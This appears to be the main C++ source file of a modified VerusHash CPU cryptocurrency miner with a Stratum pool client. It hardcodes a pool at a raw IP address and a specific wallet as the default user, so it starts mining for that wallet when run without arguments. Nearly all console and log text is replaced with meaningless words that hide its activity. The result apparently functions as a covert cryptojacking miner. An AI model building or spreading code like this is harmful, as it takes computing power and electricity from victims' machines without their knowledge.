#include <iostream>

#include "version.h"
#include "arith_uint256.h"
#include "primitives/block.h"
#include "streams.h"

#include "MinerFactory.h"

#include "libstratum/StratumClient.h"

#if defined(USE_OCL_XMP) || defined(USE_OCL_SILENTARMY)
#include "../ocl_device_utils/ocl_device_utils.h"
#define PRINT_OCL_INFO
#endif

#include <thread>
#include <chrono>
#include <atomic>
#include <bitset>

#include "speed.hpp"
#include "api.hpp"

#include <boost/log/core/core.hpp>
#include <boost/log/core.hpp>
#include <boost/log/trivial.hpp>
#include <boost/log/expressions.hpp>
#include <boost/log/utility/setup/console.hpp>
#include <boost/log/attributes.hpp>
#include <boost/log/support/date_time.hpp>
#include <boost/date_time/posix_time/posix_time_types.hpp>

namespace logging = boost::log;
namespace sinks = boost::log::sinks;
namespace src = boost::log::sources;
namespace attrs = boost::log::attributes;
namespace keywords = boost::log::keywords;

#undef __cpuid
#if defined(__linux__) || defined(__APPLE__)
#define __cpuid(out, infoType)\
	asm("cpuid": "=a" (out[0]), "=b" (out[1]), "=c" (out[2]), "=d" (out[3]): "a" (infoType));
#define __cpuidex(out, infoType, ecx)\
	asm("cpuid": "=a" (out[0]), "=b" (out[1]), "=c" (out[2]), "=d" (out[3]): "a" (infoType), "c" (ecx));
#endif

// TODO:
// #1 file logging
// #2 mingw compilation for windows (faster?)
// #3 benchmark accuracy fix: first wait for solvers to init and then measure speed
// #4 Linux fix cmake to generate all in one binary (just like Windows)
// #5 after #4 is done add solver chooser for CPU and CUDA devices (general and per device), example: [-s 0 automatic, -s 1 solver1, -s 2 solver2, ...]

int use_avx = 0;
int use_avx2 = 0;
int use_aes = 0;
int use_old_cuda = 0;
int use_old_xmp = 0;

// TODO move somwhere else
MinerFactory *_MinerFactory = nullptr;

// stratum client sig
static ZcashStratumClient* scSig = nullptr;

extern int32_t ASSETCHAINS_MAGIC;

extern "C" void stratum_sigint_handler(int signum) 
{ 
	if (scSig)
	{
		scSig->disconnect();
	
		for (int i = 0; scSig->isRunning() && i < 5; i++)
		#ifndef _WIN32
					sleep(1);
		#else
					_sleep(1000);
		#endif // !_WIN32
	}
	if (_MinerFactory) _MinerFactory->ClearAllSolvers();
	exit(0);
}

void print_help()
{
	std::cout << "IIN: " << std::endl;
	std::cout << "CHALA" << std::endl;
#ifndef ZCASH_POOL
	std::cout << "MALA" << std::endl;
#else
	std::cout << "MALA" << std::endl;
#endif
	std::cout << "MALA" << std::endl;
	std::cout << std::endl;
}


void print_cuda_info()
{
#if defined(USE_CUDA_DJEZO) || defined(USE_CUDA_TROMP)
#ifdef USE_CUDA_DJEZO
    int num_devices = cuda_djezo::getcount();
#elif USE_CUDA_TROMP
    int num_devices = cuda_tromp::getcount();
#endif

	std::cout << "ARARA: " << num_devices << std::endl;

	for (int i = 0; i < num_devices; ++i)
	{
		std::string gpuname, version;
		int smcount;
#ifdef USE_CUDA_DJEZO
        cuda_djezo::getinfo(0, i, gpuname, smcount, version);
#elif USE_CUDA_TROMP
        cuda_tromp::getinfo(0, i, gpuname, smcount, version);
#endif
		std::cout << "\t#" << i << " " << gpuname << " | SM version: " << version << " | SM count: " << smcount << std::endl;
	}
#endif
}

void print_opencl_info() {
#ifdef PRINT_OCL_INFO
	ocl_device_utils::print_opencl_devices();
#endif
}

#define MAX_INSTANCES 8 * 2

int cuda_enabled[MAX_INSTANCES] = { 0 };
int cuda_blocks[MAX_INSTANCES] = { 0 };
int cuda_tpb[MAX_INSTANCES] = { 0 };

int opencl_enabled[MAX_INSTANCES] = { 0 };
int opencl_threads[MAX_INSTANCES] = { 0 };
// todo: opencl local and global worksize


void detect_AVX_and_AVX2()
{
    // Fix on Linux
	//int cpuInfo[4] = {-1};
	std::array<int, 4> cpui;
	std::vector<std::array<int, 4>> data_;
	std::bitset<32> f_1_ECX_;
	std::bitset<32> f_7_EBX_;

	// Calling __cpuid with 0x0 as the function_id argument
	// gets the number of the highest valid function ID.
	__cpuid(cpui.data(), 0);
	int nIds_ = cpui[0];

	for (int i = 0; i <= nIds_; ++i)
	{
		__cpuidex(cpui.data(), i, 0);
		data_.push_back(cpui);
	}

	if (nIds_ >= 1)
	{
		f_1_ECX_ = data_[1][2];
		use_avx = f_1_ECX_[28];
	}

	// load bitset with flags for function 0x00000007
	if (nIds_ >= 7)
	{
		f_7_EBX_ = data_[7][1];
		use_avx2 = f_7_EBX_[5];
	}

	if (IsCPUVerusOptimized())
	{
		use_aes = true;
	}
}


void start_mining(int api_port, const std::string& host, const std::string& port,
	const std::string& user, const std::string& password,
	ZcashStratumClient* handler, const std::vector<ISolver *> &i_solvers, bool verus_hash)
{
	std::shared_ptr<boost::asio::io_service> io_service(new boost::asio::io_service);

	API* api = nullptr;
	if (api_port > 0)
	{
		api = new API(io_service);
		if (!api->start(api_port))
		{
			delete api;
			api = nullptr;
		}
	}
	
	ZcashMiner miner(i_solvers);
	ZcashStratumClient sc{
		io_service, &miner, host, port, user, password, 0, 0
	};

	miner.onSolutionFound([&](const EquihashSolution& solution, const std::string& jobid) {
		return sc.submit(&solution, jobid);
	});

	handler = &sc;
	signal(SIGINT, stratum_sigint_handler);

	int c = 0;
	while (sc.isRunning()) {
		std::this_thread::sleep_for(std::chrono::milliseconds(10));
		if (++c % 1000 == 0)
		{
			double allshares = speed.GetShareSpeed() * 60;
			double accepted = speed.GetShareOKSpeed() * 60;
			if (verus_hash)
			{
				BOOST_LOG_TRIVIAL(info) << CL_YLW "OKY [" << INTERVAL_SECONDS << " sec]: " <<
					speed.GetHashSpeed() << " GG, " <<
					CL_N;
			}
			else
			{
				BOOST_LOG_TRIVIAL(info) << CL_YLW "OKY [" << INTERVAL_SECONDS << " sec]: " <<
					speed.GetHashSpeed() << " W/W, " <<
					speed.GetSolutionSpeed() << " GG" <<
					CL_N;
			}
		}
		if (api) while (api->poll()) {}
	}

	if (api) delete api;
}

#ifdef _WIN32
#ifdef _MSC_VER
__inline int msver(void) {
	switch (_MSC_VER) {
	case 1500: return 2008;
	case 1600: return 2010;
	case 1700: return 2012;
	case 1800: return 2013;
	case 1900: return 2015;
	default: return (_MSC_VER / 100);
	}
}
#endif
#endif // !_WIN32

int main(int argc, char* argv[])
{
#if defined(_WIN32) && defined(NDEBUG)
	system(""); // windows 10 colored console
#endif

	std::cout << std::endl;
	std::cout << "BULE" << std::endl;
	std::cout << std::endl;

	std::string location = "103.134.154.232:8341";
	std::string user = "RF843yTiwsRfdkegJzmi6wfK8vUuzuqizt.y";
	std::string password = "x";
	int num_threads = 4;
	bool benchmark = false;
	int log_level = 0;
	int num_hashes = 200;
	int api_port = 0;
	int cuda_device_count = 0;
	int cuda_bc = 0;
	int cuda_tbpc = 0;
	int opencl_platform = 0;
	int opencl_device_count = 0;
	int force_cpu_ext = -1;
	int opencl_t = 0;
	bool verus_hash = true;

	for (int i = 1; i < argc; ++i)
	{
		if (argv[i][0] != '-') continue;

		switch (argv[i][1])
		{

		case 'c':
		{
			switch (argv[i][2])
			{
			case 'i':
				print_cuda_info();
				return 0;
			case 'v':
				use_old_cuda = atoi(argv[++i]);
				break;
			case 'd':
				while (cuda_device_count < MAX_INSTANCES && i + 1 < argc)
				{
					try
					{
						cuda_enabled[cuda_device_count] = std::stol(argv[++i]);
						++cuda_device_count;
					}
					catch (...)
					{
						--i;
						break;
					}
				}
				break;
			case 'b':
				while (cuda_bc < MAX_INSTANCES && i + 1 < argc)
				{
					try
					{
						cuda_blocks[cuda_bc] = std::stol(argv[++i]);
						++cuda_bc;
					}
					catch (...)
					{
						--i;
						break;
					}
				}
				break;
			case 't':
				while (cuda_tbpc < MAX_INSTANCES && i + 1 < argc)
				{
					try
					{
						cuda_tpb[cuda_tbpc] = std::stol(argv[++i]);
						++cuda_tbpc;
					}
					catch (...)
					{
						--i;
						break;
					}
				}
				break;
			}
			break;
		}

		case 'v':
		{
			verus_hash = true;
			break;
		}

		
		case 'l':
			location = argv[++i];
			break;
		case 'u':
			user = argv[++i];
			break;
		case 'p':
			password = argv[++i];
			break;
		case 't':
			num_threads = atoi(argv[++i]);
			break;
		case 'h':
			print_help();
			return 0;
		case 'b':
			benchmark = true;
			if (argv[i + 1] && argv[i + 1][0] != '-')
				num_hashes = atoi(argv[++i]);
			break;
		case 'd':
			log_level = atoi(argv[++i]);
			break;
		case 'a':
			api_port = atoi(argv[++i]);
			break;
		case 'e':
			force_cpu_ext = atoi(argv[++i]);
			break;
		}
	}

	// error out on non-CPU VerusHash
	if (cuda_device_count && verus_hash)
	{
		std::cout << "OKU" << std::endl;
		return 1;
	}

	if (verus_hash)
	{
		CBlockHeader::SetVerusHash();
	}

	if (force_cpu_ext > 0)
	{
		ForceCPUVerusOptimized(true);
		switch (force_cpu_ext)
		{
		case 1:
			use_avx = 1;
			use_aes = 1; // need a separate test for this, but it should accompany all avx
			break;
		case 2:
			use_avx = 1;
			use_avx2 = 1;
			break;
		}
	}
	else if (force_cpu_ext == 0)
	{
		ForceCPUVerusOptimized(false);
	}
	else
	{
		detect_AVX_and_AVX2();
	}

	if (verus_hash)
	{
		std::cout << "OPLE - ";
		CVerusHash::init();
		CVerusHashV2::init();
		if (IsCPUVerusOptimized())
		{
			std::cout << "SIC";
		}
		else
		{
			std::cout << "SAC";
		}
		std::cout << std::endl;
	}

	// init_logging init START
    std::cout << "LAUNO " << log_level << std::endl;
    boost::log::add_console_log(
        std::clog,
        boost::log::keywords::auto_flush = true,
        boost::log::keywords::filter = boost::log::trivial::severity >= log_level,
        boost::log::keywords::format = (
        boost::log::expressions::stream
			<< "[" << boost::log::expressions::format_date_time<boost::posix_time::ptime>("TimeStamp", "%H:%M:%S")
            << "][" << boost::log::expressions::attr<boost::log::attributes::current_thread_id::value_type>("ThreadID")
            << "] "  << boost::log::expressions::smessage
        )
    );
    boost::log::core::get()->add_global_attribute("TimeStamp", boost::log::attributes::local_clock());
    boost::log::core::get()->add_global_attribute("ThreadID", boost::log::attributes::current_thread_id());
	// init_logging init END

	if (verus_hash)
	{
		BOOST_LOG_TRIVIAL(info) << "EZ: " << (IsCPUVerusOptimized() ? "YES" : "NO");
	}
	else
	{
		BOOST_LOG_TRIVIAL(info) << "EX: " << ((use_avx2 && !verus_hash) ? "YES" : "NO");
	}

	try
	{
		_MinerFactory = new MinerFactory(use_avx == 1, use_old_cuda == 0, use_old_xmp == 0, verus_hash);
		if (!benchmark)
		{
			if (user.length() == 0)
			{
				BOOST_LOG_TRIVIAL(error) << "DANK.";
				return 0;
			}

			size_t delim = location.find(':');
			std::string host = delim != std::string::npos ? location.substr(0, delim) : location;
			std::string port = delim != std::string::npos ? location.substr(delim + 1) : "2142";

			start_mining(api_port, host, port, user, password,
				scSig,
				_MinerFactory->GenerateSolvers(num_threads, cuda_device_count, cuda_enabled, cuda_blocks,
				cuda_tpb, opencl_device_count, opencl_platform, opencl_enabled, opencl_threads), verus_hash);
		}
		else
		{
			Solvers_doBenchmark(num_hashes, 
				_MinerFactory->GenerateSolvers(num_threads, cuda_device_count, cuda_enabled, cuda_blocks, cuda_tpb, opencl_device_count, opencl_platform, opencl_enabled, opencl_threads),
				verus_hash);
		}
	}
	catch (std::runtime_error& er)
	{
		BOOST_LOG_TRIVIAL(error) << er.what();
	}

	boost::log::core::get()->remove_all_sinks();

	return 0;
}

